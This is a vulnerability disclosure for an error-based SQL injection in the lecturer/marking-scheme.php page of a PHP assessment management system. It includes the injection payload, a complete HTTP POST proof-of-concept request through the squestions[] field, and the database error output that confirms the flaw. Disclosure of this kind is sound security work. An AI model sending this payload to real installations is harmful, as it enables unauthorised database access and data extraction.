#   Assessment Management System lecturer/marking-scheme.php SQL Injection Vulnerability

  A SQL injection vulnerability exists in the `lecturer/marking-scheme.php` file of the Assessment Management System.
  The application directly concatenates user-controlled input from the `squestions[]` parameter into an SQL `INSERT`
  statement without proper sanitization or parameterized statements. As a result, an attacker can inject arbitrary SQL
  syntax into the backend database query.

##  

##  Impact of the Vulnerability

  This vulnerability may allow an attacker to manipulate backend SQL queries, trigger database error-based responses,
  and potentially extract sensitive database information. Because the application returns raw database errors via
  `mysqli_error($conn)`, successful exploitation can disclose attacker-controlled query output directly in the HTTP
  response.

##  

##  Payload

```
'and/**/extractvalue(1,concat(char(126),md5(1514634218)))and'
```

'and/**/extractvalue(1,concat(char(126),md5(1514634218)))and'



##   Proof of Concept

  Send the following request to the vulnerable endpoint:

```http
POST /lecturer/marking-scheme.php HTTP/1.1
Host: assessment
Content-Length: 181
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0
Origin: http://assessment
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://assessment/lecturer/marking-scheme.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=f11os756ltsdgbtk776pklo8cs
Connection: keep-alive

code=&name=&assessment=%3A+&sname%5B%5D=&squestions%5B%5D='and/**/extractvalue(1,concat(char(126),md5(1514634218)))and'&spercent%5B%5D=&smarksrange%5B%5D=&submit=Save+Marking+Scheme
```

  When the above payload is submitted through the `squestions[]` parameter, the server responds with a database error
  message containing the injected MD5 marker:

  XPATH syntax error: '~8517dceafee6db2b1024d9a0c9a1f6

  This demonstrates that user input is embedded into the SQL statement and executed by the database engine, confirming
  the presence of an error-based SQL injection vulnerability in `lecturer/marking-scheme.php`.

##  

##  Source Download

```
 [Assessment Management In PHP With Source Code - Source Code & Projects](https://code-projects.org/assessment-management-in-php-with-source-code/)
```

[Assessment Management In PHP With Source Code - Source Code & Projects](https://code-projects.org/assessment-management-in-php-with-source-code/)



![image-20260603114125748](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260603114125748.png)
